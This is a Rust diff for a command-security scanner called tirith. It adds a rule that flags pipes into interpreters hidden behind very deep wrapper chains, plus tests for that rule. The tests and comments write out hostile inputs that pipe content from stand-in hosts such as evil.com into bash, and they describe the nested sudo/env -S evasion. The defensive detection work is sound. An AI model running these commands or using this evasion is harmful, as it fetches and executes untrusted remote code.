@@ -896,6 +896,23 @@ fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option
     resolve_interpreter_name_depth(seg, shell, MAX_WRAPPER_DEPTH)
 }
 
+/// Resolve the effective interpreter AND report whether resolution gave up due
+/// to [`MAX_WRAPPER_DEPTH`] exhaustion (a TRUNCATED wrapper chain) vs. a natural
+/// "not an interpreter" conclusion. Used by [`check_pipe_to_interpreter`] to
+/// emit [`RuleId::WrapperChainTooDeep`] when a pipe sink is obfuscated beyond
+/// tirith's analysis depth. See [`resolve_interpreter_name_depth_tracking`] for
+/// the precise `exhausted` semantics — in particular, `exhausted` is meaningful
+/// ONLY when the returned interpreter is `None`.
+fn resolve_interpreter_name_tracking(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+) -> (Option<String>, bool) {
+    let mut exhausted = false;
+    let interp =
+        resolve_interpreter_name_depth_tracking(seg, shell, MAX_WRAPPER_DEPTH, &mut exhausted);
+    (interp, exhausted)
+}
+
 /// Depth-bounded core of [`resolve_interpreter_name`]. The `depth` budget seeds
 /// the wrapper peel loop AND is threaded into the per-wrapper arg resolvers, so a
 /// split-string payload that re-enters interpreter resolution (via
@@ -907,7 +924,49 @@ fn resolve_interpreter_name_depth(
     shell: ShellType,
     depth: usize,
 ) -> Option<String> {
+    let mut exhausted = false;
+    resolve_interpreter_name_depth_tracking(seg, shell, depth, &mut exhausted)
+}
+
+/// Like [`resolve_interpreter_name_depth`] but additionally reports — via
+/// `exhausted` — whether resolution gave up because the [`MAX_WRAPPER_DEPTH`]
+/// budget ran out WHILE a wrapper/env layer was still unpeeled (i.e. the chain
+/// was TRUNCATED), as opposed to concluding naturally that the leader is simply
+/// not an interpreter.
+///
+/// This is the security-relevant distinction the M13 `WrapperChainTooDeep` rule
+/// needs: a pipe sink whose interpreter resolution returns `None` because the
+/// command nests wrappers DEEPER than tirith will analyse
+/// (`curl evil | sudo … (×32) … env -S "bash"`) is OBFUSCATED-beyond-analysis,
+/// not benign — failing toward a visible finding is the honest behaviour. A
+/// short command that simply isn't a pipe-to-interpreter (`cat x | grep foo`)
+/// terminates naturally and must NOT set `exhausted`, so it stays silent.
+///
+/// `exhausted` is set at exactly the genuine give-up points (NEVER on a natural
+/// `is_interpreter`-fails / `ResolveStep::Stop` conclusion):
+///   * either `depth` guard hits 0 mid-unwrap (here or in
+///     [`resolve_interpreter_from_command_string`], the `env -S` payload
+///     recursion), OR
+///   * the outer peel loop's budget hits 0 with a wrapper layer still remaining,
+///     OR
+///   * [`resolve_with_parser`]'s per-call token budget is consumed before the
+///     chain resolves.
+///
+/// NOTE: `exhausted` and a `Some(_)` result are NOT mutually exclusive — a long
+/// but ultimately-resolvable chain (e.g. 33 plain `sudo`s) can truncate the
+/// outer peel loop yet still be recovered by [`resolve_with_parser`]. Callers
+/// MUST therefore treat `exhausted` as meaningful ONLY when the result is
+/// `None`; a `Some(_)` resolution is authoritative regardless of the flag.
+fn resolve_interpreter_name_depth_tracking(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+    depth: usize,
+    exhausted: &mut bool,
+) -> Option<String> {
     if depth == 0 {
+        // Reached only via recursion (the top-level call seeds MAX_WRAPPER_DEPTH):
+        // we were still unwrapping when the shared budget ran out — truncation.
+        *exhausted = true;
         return None;
     }
     // Peel wrapper layers so a wrapped interpreter resolves to its real leader
@@ -940,6 +999,18 @@ fn resolve_interpreter_name_depth(
         }
         budget -= 1;
     }
+    // Budget ran out with a wrapper layer STILL peelable — the chain was
+    // truncated, not concluded. The downstream `resolve_*_args_depth` calls below
+    // (seeded with `budget == 0`) MAY still recover the leader via
+    // [`resolve_with_parser`]'s independent token budget (so this does not by
+    // itself imply a `None` result), but it is a genuine give-up signal: record
+    // it so a caller that DOES get `None` can tell truncation from a clean miss.
+    if budget == 0 {
+        let probe = current.as_ref().unwrap_or(seg);
+        if unwrap_one_wrapper_segment(probe, shell).is_some() {
+            *exhausted = true;
+        }
+    }
     let seg = current.as_ref().unwrap_or(seg);
 
     if let Some(ref cmd) = seg.command {
@@ -957,14 +1028,14 @@ fn resolve_interpreter_name_depth(
 
         // Brace group: { cmd; } — the interpreter sits in the first arg.
         if cmd_base == "{" {
-            return resolve_from_args_depth(&seg.args, shell, budget);
+            return resolve_from_args_depth(&seg.args, shell, budget, exhausted);
         }
 
         match cmd_base.as_str() {
-            "sudo" => return resolve_sudo_args_depth(&seg.args, shell, budget),
-            "env" => return resolve_env_args_depth(&seg.args, shell, budget),
+            "sudo" => return resolve_sudo_args_depth(&seg.args, shell, budget, exhausted),
+            "env" => return resolve_env_args_depth(&seg.args, shell, budget, exhausted),
             "command" | "exec" | "nohup" => {
-                return resolve_wrapper_args_depth(&seg.args, &cmd_base, shell, budget);
+                return resolve_wrapper_args_depth(&seg.args, &cmd_base, shell, budget, exhausted);
             }
             _ => {}
         }
@@ -1192,8 +1263,15 @@ fn resolve_interpreter_from_command_string(
     command: &str,
     shell: ShellType,
     depth: usize,
+    exhausted: &mut bool,
 ) -> Option<String> {
     if depth == 0 {
+        // The shared wrapper-chain budget ran out while we were still descending
+        // into an `env -S` payload — the chain is truncated, not concluded. This
+        // is THE give-up point for the `<…×32 wrappers…> env -S "bash"` evasion:
+        // the payload's leader is never inspected, so without this signal the
+        // pipe-to-shell detector would return `None` and stay silent.
+        *exhausted = true;
         return None;
     }
     let normalized = normalize_shell_token(command.trim(), shell);
@@ -1202,7 +1280,7 @@ fn resolve_interpreter_from_command_string(
     }
     let segments = tokenize::tokenize(&normalized, shell);
     let first = segments.first()?;
-    resolve_interpreter_name_depth(first, shell, depth - 1)
+    resolve_interpreter_name_depth_tracking(first, shell, depth - 1, exhausted)
 }
 
 fn unwrap_env_split_string_segment(
@@ -1344,16 +1422,31 @@ enum ResolveStep<'a> {
 /// Resolve interpreter from a generic arg list. Uses an iterative parser with a
 /// token-inspection budget so deeply nested wrappers cannot bypass detection.
 /// `depth` bounds the cross-`env -S`-payload recursion (see [`resolve_step_env`]).
-fn resolve_from_args_depth(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
-    resolve_with_parser(args, shell, ResolverParser::Generic, depth)
+fn resolve_from_args_depth(
+    args: &[String],
+    shell: ShellType,
+    depth: usize,
+    exhausted: &mut bool,
+) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Generic, depth, exhausted)
 }
 
-fn resolve_sudo_args_depth(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
-    resolve_with_parser(args, shell, ResolverParser::Sudo, depth)
+fn resolve_sudo_args_depth(
+    args: &[String],
+    shell: ShellType,
+    depth: usize,
+    exhausted: &mut bool,
+) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Sudo, depth, exhausted)
 }
 
-fn resolve_env_args_depth(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
-    resolve_with_parser(args, shell, ResolverParser::Env, depth)
+fn resolve_env_args_depth(
+    args: &[String],
+    shell: ShellType,
+    depth: usize,
+    exhausted: &mut bool,
+) -> Option<String> {
+    resolve_with_parser(args, shell, ResolverParser::Env, depth, exhausted)
 }
 
 fn resolve_wrapper_args_depth(
@@ -1361,6 +1454,7 @@ fn resolve_wrapper_args_depth(
     wrapper: &str,
     shell: ShellType,
     depth: usize,
+    exhausted: &mut bool,
 ) -> Option<String> {
     let parser = match wrapper {
         "command" => ResolverParser::Command,
@@ -1368,7 +1462,7 @@ fn resolve_wrapper_args_depth(
         "nohup" => ResolverParser::Nohup,
         _ => ResolverParser::Command,
     };
-    resolve_with_parser(args, shell, parser, depth)
+    resolve_with_parser(args, shell, parser, depth, exhausted)
 }
 
 /// `depth` bounds recursion when an `env -S` split-string payload re-enters
@@ -1376,11 +1470,19 @@ fn resolve_wrapper_args_depth(
 /// it and rely on the per-call token-inspection `budget` below. It is threaded
 /// into [`resolve_step_env`] so a nested split-string payload shares one
 /// shrinking budget with the outer resolve (CodeRabbit M13 PR #132 round-23).
+///
+/// `exhausted` (see [`resolve_interpreter_name_depth_tracking`]) is set if the
+/// per-call token `budget` is consumed before the chain resolves, OR if the
+/// `env -S` payload recursion bottoms out at `depth == 0` — both genuine
+/// "ran out of analysis budget while a wrapper layer remained" give-ups. A
+/// natural `ResolveStep::Stop` (the leader is simply not an interpreter) does
+/// NOT set it.
 fn resolve_with_parser(
     args: &[String],
     shell: ShellType,
     start_parser: ResolverParser,
     depth: usize,
+    exhausted: &mut bool,
 ) -> Option<String> {
     if args.is_empty() {
         return None;
@@ -1395,7 +1497,7 @@ fn resolve_with_parser(
         let step = match parser {
             ResolverParser::Generic => resolve_step_generic(current, shell),
             ResolverParser::Sudo => resolve_step_sudo(current, shell),
-            ResolverParser::Env => resolve_step_env(current, shell, depth),
+            ResolverParser::Env => resolve_step_env(current, shell, depth, exhausted),
             ResolverParser::Command => resolve_step_wrapper(current, shell, "command"),
             ResolverParser::Exec => resolve_step_wrapper(current, shell, "exec"),
             ResolverParser::Nohup => resolve_step_wrapper(current, shell, "nohup"),
@@ -1403,6 +1505,8 @@ fn resolve_with_parser(
 
         match step {
             ResolveStep::Found(interpreter) => return Some(interpreter),
+            // Natural conclusion: the leader is not an interpreter. NOT a budget
+            // give-up, so `exhausted` is left untouched.
             ResolveStep::Stop => return None,
             ResolveStep::Next {
                 parser: next_parser,
@@ -1414,6 +1518,11 @@ fn resolve_with_parser(
                 budget = budget.saturating_sub(inspected.max(1));
             }
         }
+    }
+    // The per-call token budget ran out with tokens still unconsumed — an
+    // adversarially long/nested wrapper chain that outran our analysis budget.
+    if budget == 0 && !current.is_empty() {
+        *exhausted = true;
     }
     None
 }
@@ -1540,7 +1649,12 @@ fn resolve_step_sudo<'a>(args: &'a [String], shell: ShellType) -> ResolveStep<'a
     ResolveStep::Stop
 }
 
-fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> ResolveStep<'a> {
+fn resolve_step_env<'a>(
+    args: &'a [String],
+    shell: ShellType,
+    depth: usize,
+    exhausted: &mut bool,
+) -> ResolveStep<'a> {
     let value_short_flags = ["-u", "-C"];
     let value_long_flags = [
         "--unset",
@@ -1571,9 +1685,12 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> R
             // leader (CodeRabbit M13 PR #132 round-23).
             if normalized == "--split-string" {
                 if idx + 1 < args.len() {
-                    if let Some(interp) =
-                        resolve_interpreter_from_command_string(&args[idx + 1], shell, depth)
-                    {
+                    if let Some(interp) = resolve_interpreter_from_command_string(
+                        &args[idx + 1],
+                        shell,
+                        depth,
+                        exhausted,
+                    ) {
                         return ResolveStep::Found(interp);
                     }
                 }
@@ -1581,7 +1698,9 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> R
                 continue;
             }
             if let Some(val) = normalized.strip_prefix("--split-string=") {
-                if let Some(interp) = resolve_interpreter_from_command_string(val, shell, depth) {
+                if let Some(interp) =
+                    resolve_interpreter_from_command_string(val, shell, depth, exhausted)
+                {
                     return ResolveStep::Found(interp);
                 }
                 idx += 1;
@@ -1608,7 +1727,7 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> R
             // to its real leader `bash` (CodeRabbit M13 PR #132 round-23).
             if idx + 1 < args.len() {
                 if let Some(interp) =
-                    resolve_interpreter_from_command_string(&args[idx + 1], shell, depth)
+                    resolve_interpreter_from_command_string(&args[idx + 1], shell, depth, exhausted)
                 {
                     return ResolveStep::Found(interp);
                 }
@@ -1622,7 +1741,9 @@ fn resolve_step_env<'a>(args: &'a [String], shell: ShellType, depth: usize) -> R
         // separate-arg `-S` arm above), so a wrapped interpreter inside the
         // attached payload still resolves (CodeRabbit M13 PR #132 round-23).
         if let Some(cmd) = attached_env_split_string_command(&normalized) {
-            if let Some(interp) = resolve_interpreter_from_command_string(cmd, shell, depth) {
+            if let Some(interp) =
+                resolve_interpreter_from_command_string(cmd, shell, depth, exhausted)
+            {
                 return ResolveStep::Found(interp);
             }
             idx += 1;
@@ -1705,7 +1826,8 @@ fn check_pipe_to_interpreter(
         }
         if let Some(sep) = &seg.preceding_separator {
             if sep == "|" || sep == "|&" {
-                if let Some(interpreter) = resolve_interpreter_name(seg, shell) {
+                let (interpreter_opt, exhausted) = resolve_interpreter_name_tracking(seg, shell);
+                if let Some(interpreter) = interpreter_opt {
                     let source = &segments[i - 1];
                     let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
                     let source_base = normalize_cmd_base(source_cmd_ref, shell);
@@ -1794,6 +1916,71 @@ fn check_pipe_to_interpreter(
                         severity: Severity::High,
                         title: format!("Pipe to interpreter: {source_cmd_ref} | {display_cmd}"),
                         description,
+                        evidence,
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
+                } else if exhausted {
+                    // The pipe SINK's interpreter could not be resolved because
+                    // its wrapper chain nests DEEPER than `MAX_WRAPPER_DEPTH`
+                    // (`curl evil | sudo …(×32)… env -S "bash"`, nested
+                    // `env -S "env -S \"…\""`). Resolution gave up while a wrapper
+                    // layer was still unpeeled — NOT a clean "this isn't an
+                    // interpreter" conclusion. Returning silently here is the exact
+                    // evasion this rule closes: an obfuscated-beyond-analysis pipe
+                    // is suspicious, so we surface a VISIBLE finding rather than
+                    // pass it. Warn (Medium) — "unable to fully analyse", not a
+                    // confirmed exploit, so it doesn't hard-block (32 nested
+                    // wrappers has no benign use, but a confirmed pipe-to-shell
+                    // already blocks via the High rules above; this is the honest
+                    // fail-visible signal for the cases those cannot resolve).
+                    let source = &segments[i - 1];
+                    let source_cmd_ref = source.command.as_deref().unwrap_or("unknown");
+                    let source_base = normalize_cmd_base(source_cmd_ref, shell);
+
+                    // tirith's own output is trusted — mirror the Some-branch skip
+                    // so `tirith view … | <deeply wrapped>` is not flagged. (A
+                    // `tirith run` source is NOT skipped — it executes fetched
+                    // content like any other source.)
+                    let source_is_tirith_run = source_base == "tirith"
+                        && source
+                            .args
+                            .first()
+                            .map(|arg| normalize_cmd_base(arg, shell) == "run")
+                            .unwrap_or(false);
+                    if source_base == "tirith" && !source_is_tirith_run {
+                        continue;
+                    }
+
+                    let sink_ref = seg.command.as_deref().unwrap_or("unknown");
+                    let mut evidence = vec![Evidence::CommandPattern {
+                        pattern: "pipe to over-nested wrapper chain".to_string(),
+                        matched: redact::redact_shell_assignments(&format!(
+                            "{} | {}",
+                            source.raw, seg.raw
+                        )),
+                    }];
+                    for url in extract_urls_from_args(&source.args, shell) {
+                        evidence.push(Evidence::Url { raw: url });
+                    }
+
+                    findings.push(Finding {
+                        rule_id: RuleId::WrapperChainTooDeep,
+                        severity: Severity::Medium,
+                        title: format!(
+                            "Pipe to over-obfuscated command: {source_cmd_ref} | {sink_ref}"
+                        ),
+                        description:
+                            "Command pipes output into an interpreter hidden behind more wrapper \
+                             layers (sudo / env -S / command / exec / nohup) than tirith will \
+                             unwrap (depth limit 32). The real interpreter cannot be resolved, so \
+                             the pipe-to-shell detectors cannot confirm what runs. Such deep \
+                             nesting has no legitimate use and is a known obfuscation technique. \
+                             Treat as suspicious: capture the piped content to a file and inspect \
+                             it before running, rather than executing it sight-unseen."
+                                .to_string(),
                         evidence,
                         human_view: None,
                         agent_view: None,
@@ -3142,6 +3329,127 @@ mod tests {
         );
     }
 
+    // ── M13: WrapperChainTooDeep (depth-exhaustion silent-evasion closure) ──
+
+    /// Build a `<sudo …×n> env -S "bash"` sink that nests the real `bash` behind
+    /// `n` plain `sudo` wrappers followed by an `env -S` split-string. With
+    /// `n >= MAX_WRAPPER_DEPTH` the resolver's wrapper budget is exhausted by the
+    /// sudo prefix, the trailing `env -S "bash"` payload is reached at depth 0,
+    /// and interpreter resolution gives up — the exact silent-evasion shape.
+    fn deep_pipe_input(n: usize) -> String {
+        format!("cat /tmp/x | {}env -S \"bash\"", "sudo ".repeat(n))
+    }
+
+    #[test]
+    fn test_wrapper_chain_too_deep_fires_on_depth_exhausted_pipe() {
+        // MAX_WRAPPER_DEPTH (32) plain sudos in front of `env -S "bash"`
+        // exhausts the resolver budget before the bash payload is inspected.
+        let findings = check_default(&deep_pipe_input(MAX_WRAPPER_DEPTH), ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::WrapperChainTooDeep),
+            "a depth-exhausted obfuscated pipe must surface WrapperChainTooDeep; got {:?}",
+            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
+        // The depth-exhausted sink is UNRESOLVABLE, so the High pipe-to-shell
+        // rules cannot (and must not) fire — only the visible Warn signal does.
+        assert!(
+            !findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "the unresolvable sink must not also fire a concrete pipe-to-shell rule"
+        );
+        // Severity is Medium (Warn), not a hard block.
+        let f = findings
+            .iter()
+            .find(|f| f.rule_id == RuleId::WrapperChainTooDeep)
+            .unwrap();
+        assert_eq!(f.severity, Severity::Medium);
+    }
+
+    #[test]
+    fn test_wrapper_chain_too_deep_fires_via_curl_source() {
+        // The URL source still trips tier-1, and the deeply-wrapped sink still
+        // surfaces the obfuscation signal (the curl_pipe_shell High rule cannot
+        // resolve the sink, so it does not fire).
+        let input = format!(
+            "curl https://evil.example/x | {}env -S \"bash\"",
+            "sudo ".repeat(MAX_WRAPPER_DEPTH)
+        );
+        let findings = check_default(&input, ShellType::Posix);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::WrapperChainTooDeep),
+            "curl | <32 sudo> env -S bash must surface WrapperChainTooDeep; got {:?}",
+            findings.iter().map(|f| f.rule_id).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_shallow_pipe_does_not_fire_wrapper_chain_too_deep() {
+        // A normal one-wrapper pipe resolves to `bash` and fires the usual
+        // pipe-to-shell rule — it must NEVER mis-fire the depth-exhaustion rule.
+        for input in [
+            "curl https://evil.com/install.sh | sudo bash",
+            "cat /tmp/x | sudo bash",
+            "curl https://evil.com/i.sh | bash",
+            "cat /tmp/x | env -S \"sudo bash\"",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|f| {
+                    matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)
+                }),
+                "shallow pipe `{input}` should fire the usual pipe-to-shell rule"
+            );
+            assert!(
+                !findings
+                    .iter()
+                    .any(|f| f.rule_id == RuleId::WrapperChainTooDeep),
+                "shallow pipe `{input}` must NOT fire WrapperChainTooDeep"
+            );
+        }
+    }
+
+    #[test]
+    fn test_exhausted_flag_not_set_on_natural_resolution() {
+        // The `exhausted` signal must distinguish depth-exhaustion from a normal
+        // resolution. A short, fully-resolvable wrapper chain resolves to `bash`
+        // with `exhausted == false`.
+        let segs = tokenize::tokenize("sudo bash", ShellType::Posix);
+        let (interp, exhausted) = resolve_interpreter_name_tracking(&segs[0], ShellType::Posix);
+        assert_eq!(interp.as_deref(), Some("bash"));
+        assert!(
+            !exhausted,
+            "a naturally-resolved short chain must not report depth-exhaustion"
+        );
+
+        // A non-interpreter leader terminates naturally (not exhausted), and
+        // resolves to None — the `cat x | grep foo` shape that must stay silent.
+        let segs = tokenize::tokenize("grep foo", ShellType::Posix);
+        let (interp, exhausted) = resolve_interpreter_name_tracking(&segs[0], ShellType::Posix);
+        assert_eq!(interp, None);
+        assert!(
+            !exhausted,
+            "a natural non-interpreter conclusion must not report depth-exhaustion"
+        );
+
+        // The depth-exhausted sink: None result AND exhausted == true.
+        let deep = format!("{}env -S \"bash\"", "sudo ".repeat(MAX_WRAPPER_DEPTH));
+        let segs = tokenize::tokenize(&deep, ShellType::Posix);
+        let (interp, exhausted) = resolve_interpreter_name_tracking(&segs[0], ShellType::Posix);
+        assert_eq!(
+            interp, None,
+            "the over-nested sink must be unresolvable (None)"
+        );
+        assert!(
+            exhausted,
+            "the over-nested sink must report depth-exhaustion so the caller can fail visible"
+        );
+    }
+
     #[test]
     fn test_pipe_env_var_assignment_detected() {
         let findings = check_default("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
@@ -3888,12 +4196,18 @@ mod tests {
             );
         }
 
+        // `exhausted` is exercised in its own dedicated test
+        // (`test_exhausted_flag_not_set_on_natural_resolution`); here it is a
+        // write-only sink so the resolver-level calls type-check.
+        let mut ex = false;
+
         // (2) A plain (un-wrapped) interpreter payload still resolves to bash.
         assert_eq!(
             resolve_env_args_depth(
                 &["-S".into(), "bash -c id".into()],
                 ShellType::Posix,
-                MAX_WRAPPER_DEPTH
+                MAX_WRAPPER_DEPTH,
+                &mut ex,
             )
             .as_deref(),
             Some("bash"),
@@ -3904,7 +4218,8 @@ mod tests {
             resolve_env_args_depth(
                 &["-S".into(), "sudo bash -c id".into()],
                 ShellType::Posix,
-                MAX_WRAPPER_DEPTH
+                MAX_WRAPPER_DEPTH,
+                &mut ex,
             )
             .as_deref(),
             Some("bash"),
@@ -3917,7 +4232,8 @@ mod tests {
             resolve_env_args_depth(
                 &["-S".into(), "ls -la".into()],
                 ShellType::Posix,
-                MAX_WRAPPER_DEPTH
+                MAX_WRAPPER_DEPTH,
+                &mut ex,
             ),
             None,
             "non-interpreter env -S payload stays unresolved"
@@ -3926,7 +4242,8 @@ mod tests {
             resolve_interpreter_from_command_string(
                 "sudo apt install x",
                 ShellType::Posix,
-                MAX_WRAPPER_DEPTH
+                MAX_WRAPPER_DEPTH,
+                &mut ex,
             ),
             None,
             "wrapped non-interpreter payload stays unresolved"
@@ -3937,9 +4254,19 @@ mod tests {
         // value at exhaustion is unspecified; the point is the call RETURNS without
         // unbounded recursion / stack overflow.
         let deep = "sudo ".repeat(5000) + "bash -c id";
-        let _ = resolve_interpreter_from_command_string(&deep, ShellType::Posix, MAX_WRAPPER_DEPTH);
+        let _ = resolve_interpreter_from_command_string(
+            &deep,
+            ShellType::Posix,
+            MAX_WRAPPER_DEPTH,
+            &mut ex,
+        );
         let nested = "env -S ".repeat(500) + "sudo bash -c id";
-        let _ = resolve_env_args_depth(&["-S".into(), nested], ShellType::Posix, MAX_WRAPPER_DEPTH);
+        let _ = resolve_env_args_depth(
+            &["-S".into(), nested],
+            ShellType::Posix,
+            MAX_WRAPPER_DEPTH,
+            &mut ex,
+        );
     }
 
     #[test]
